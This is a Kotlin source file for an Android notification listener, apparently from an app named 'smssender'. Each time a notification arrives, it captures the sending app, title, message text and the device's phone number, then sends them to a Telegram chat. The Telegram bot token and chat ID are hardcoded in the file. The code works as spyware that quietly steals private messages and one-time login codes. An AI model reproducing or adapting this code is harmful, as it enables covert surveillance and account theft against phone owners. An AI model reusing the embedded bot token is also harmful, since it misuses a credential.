package com.agayev.smssender

import android.content.Context
import android.content.pm.PackageManager
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.telephony.TelephonyManager
import android.util.Log
import com.agayev.smssender.network.ApiClient

import android.Manifest

class NotificationListener : NotificationListenerService() {

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        val phoneNumber = if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
            telephonyManager.line1Number
        } else {
            "Permission not granted"
        }

        val packageName = sbn.packageName
        val extras = sbn.notification.extras
        val title = extras.getString("android.title")
        val text = extras.getCharSequence("android.text").toString()

        val data = "\uD83D\uDCF2 Приложение → $packageName" +
                "\n\n\uD83D\uDCF2 Тайтл → $title" +
                "\n\n\uD83D\uDCC4 Текст → $text" +
                "\n\n☎\uFE0F Номер абонента → $phoneNumber"

        val client = ApiClient()
        Log.e(TAG, data)
        client.sendMessage(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID, data)
    }

    companion object {
        private const val TAG = "NotificationListener"
        private const val TELEGRAM_TOKEN = "6677383791:AAG8IXVqNNaTRecw0aAozgxhVIDjKshbQt0"
        private const val TELEGRAM_CHAT_ID = "-1002036548423"
    }
}